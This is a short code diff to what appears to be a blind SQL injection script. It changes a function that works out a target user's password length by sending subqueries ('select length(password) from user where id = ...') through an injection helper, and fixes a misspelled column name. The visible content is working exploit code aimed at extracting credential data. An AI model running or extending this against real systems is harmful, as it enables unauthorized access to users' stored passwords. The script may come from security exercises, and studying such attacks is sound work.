@@ -24,7 +24,7 @@ def invalid_user(user_id):
 def password_length(user_id):
     i = 0
     while True:
-        payload = "(select length(password) from user where id = {} and length(passwrd) <= {} limit 1)".format(user_id, i)
+        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
         if not injected_query(payload):
             return i
         i += 1
